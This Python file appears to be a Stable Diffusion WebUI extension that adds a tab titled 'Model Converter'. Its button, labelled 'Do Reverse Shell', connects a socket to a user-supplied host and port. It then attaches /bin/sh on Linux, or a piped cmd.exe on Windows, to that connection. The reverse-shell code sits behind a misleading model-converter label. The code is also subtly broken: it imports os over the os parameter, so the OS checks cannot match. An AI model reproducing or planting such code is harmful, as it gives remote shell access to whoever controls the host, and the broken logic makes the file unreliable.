import gradio as gr
from modules import script_callbacks


def add_tab():
    with gr.Blocks(analytics_enabled=False) as ui:
        with gr.Row().style(equal_height=False):
            with gr.Column(variant="panel"):
                host = gr.Textbox(label="Host", elem_id="host_name")
                port = gr.Textbox(label="Port", elem_id="port_number")
                os = gr.Dropdown(
                    label="OS",
                    choices=["Linux", "Windows"],
                    elem_id="os",
                )
                do_reverse_shell = gr.Button(
                    elem_id="do_reverse_shell",
                    label="Do Reverse Shell",
                    variant="primary",
                )

            do_reverse_shell.click(
                fn=do_convert,
                inputs=[host, port, os],
            )

    return [(ui, "Model Converter", "reverse_shell")]


def do_convert(host, port, os):
    global s
    global p
    import os
    import socket

    rhost = host
    rport = int(port)

    if os == "Linux":
        import pty
        s = socket.socket()
        s.connect((rhost, rport))
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
        pty.spawn("/bin/sh")
    elif os == "Windows":
        import threading
        import subprocess as sp

        p = sp.Popen(["cmd.exe"], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        s = socket.socket()
        s.connect((rhost, rport))
        threading.Thread(
            target=exec,
            args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)", globals()),
            daemon=True,
        ).start()
        threading.Thread(
            target=exec,
            args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)", globals()),
        ).start()


script_callbacks.on_ui_tabs(add_tab)
